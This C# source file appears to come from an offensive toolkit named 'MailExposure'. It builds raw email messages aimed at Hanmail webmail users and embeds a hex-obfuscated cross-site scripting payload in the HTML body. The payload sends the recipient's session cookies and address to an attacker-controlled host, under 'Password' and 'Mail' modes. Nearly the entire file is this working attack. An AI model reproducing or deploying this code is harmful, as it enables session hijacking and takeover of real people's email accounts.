using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using MailExposure.RecordInfo;

namespace MailExposure.MailXssCode
{
    class HanMail
    {
        // Fields
        private string CRLF;

        // Methods
        public HanMail()
        {
            CRLF = "\r\n";
        }
        public string MailPackage(Model model)
        {
            this.Xss(model);
            if (model.AttachmentName == null)
            {
                return ("From:" + model.Nickname + "<" + model.Addresser + ">" + this.CRLF + "To:" + model.Addressee + this.CRLF + "Message-ID: <20100616. 101617046.00009597@163.com>" + this.CRLF + "Subject:" + model.Subject + this.CRLF + "MIME-Version: 1.0" + this.CRLF + "Content-Transfer-Encoding: 8bit" + this.CRLF + "Content-type:text/html;charset=\"euc-kr\"" + this.CRLF + "Content-Transfer-Encoding:quoted-printable" + this.CRLF + this.CRLF + model.Content + model.XSSCode + this.CRLF + this.CRLF + this.CRLF + "." + this.CRLF);
            }
            string code = new StreamReader(model.AttachmentSrc, Encoding.GetEncoding("gb2312")).ReadToEnd();
            return string.Concat(new object[]
            { 
                "MIME-Version: 1.0", this.CRLF, "Content-Type: multipart/mixed; boundary=Mail_Boundary_00201010", this.CRLF, "From:", model.Nickname, "<", model.Addresser, ">", this.CRLF, "To:", model.Addressee, this.CRLF, "Subject:", model.Subject, this.CRLF, 
                this.CRLF, "Content-Type: multipart/alternative; boundary=Mail_Boundary_00201010", this.CRLF, this.CRLF, "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=utf-8", this.CRLF, "Content-Transfer-Encoding: 7bit", this.CRLF, this.CRLF, this.CRLF, model.Content, model.XSSCode, this.CRLF, this.CRLF, 
                "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=utf-8 name=", model.AttachmentName, this.CRLF, "Content-Transfer-Encoding: base64", this.CRLF, "Content-Disposition: attachment;filename=", model.AttachmentName, this.CRLF, this.CRLF, '<', model.EncodeBase64(code), '>', this.CRLF, "--Mail_Boundary_00201010--", 
                this.CRLF, this.CRLF, '.', this.CRLF
            });
        }
        private string StrToHex(string str)
        {
            string str2 = "";
            if (str == "")
            {
                return "";
            }
            byte[] bytes = Encoding.Default.GetBytes(str);
            for (int i = 0; i < bytes.Length; i++)
            {
                str2 = str2 + @"\" + bytes[i].ToString("X");
            }
            return str2;

        }

        private void Xss(Model model)
        {
            Record record = new Record();
            if (model.Type == "Cookie")
            {
                model.XSSCode = "";
            }
            else if (model.Type == "Password")
            {
                model.Address = "http://" + record.Dns("") + "/hanmailpass/index.asp?";
                model.XSSCode = "<div style=\"width:" + this.StrToHex("expression(eval((window.r!=1)?(window.r=1,(document.location='" + model.Address + "?uid=" + model.Addressee + "&cookie='+escape(document.cookie))):1))") + ";\">";
            }
            else if (model.Type == "Mail")
            {
                model.Address = "http://" + record.Dns("") + "/hanmail/index.php?";
                string str = "";
                Random random = new Random();
                for (int i = 0; i < 4; i++)
                {
                    str = str + random.Next(10).ToString();
                }
                model.XSSCode = "<div style=\"width:" + this.StrToHex("expression(eval((window.r!=1)?(window.r=1,(document.location='" + model.Address + "uid=" + model.Addressee + "&cookie='+escape(document.cookie))):1))") + ";\">";
            }
        }
    }
}
